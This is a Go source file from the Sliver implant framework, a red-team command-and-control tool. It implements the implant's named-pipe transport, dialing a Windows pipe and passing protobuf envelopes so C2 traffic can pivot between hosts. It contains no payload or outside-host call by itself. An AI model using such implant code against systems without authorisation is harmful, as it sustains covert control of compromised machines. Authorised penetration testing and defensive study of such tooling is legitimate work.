package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .NamePipec2Enabled}}

import (
	"net/url"
	"strings"

	// {{if .Debug}}
	"log"
	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/sliver/pivots/namedpipe"
)

func namePipeDial(uri *url.URL) (*namedpipe.PipeConn, error) {
	address := uri.String()
	address = strings.ReplaceAll(address, "namedpipe://", "")
	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
	// {{if .Debug}}
	log.Print("Named pipe address: ", address)
	// {{end}}
	return namedpipe.Dial(address)
}

func namedPipeWriteEnvelope(conn *namedpipe.PipeConn, envelope *pb.Envelope) error {
	// {{if .Debug}}
	log.Printf("namedPipeWriteEnvelope %d\n", envelope.GetType())
	// {{end}}
	return namedpipe.PivotWriteEnvelope(conn, envelope)
}

func namedPipeReadEnvelope(conn *namedpipe.PipeConn) (*pb.Envelope, error) {
	return namedpipe.PivotReadEnvelope(conn)
}

// {{end}} -NamePipec2Enabled
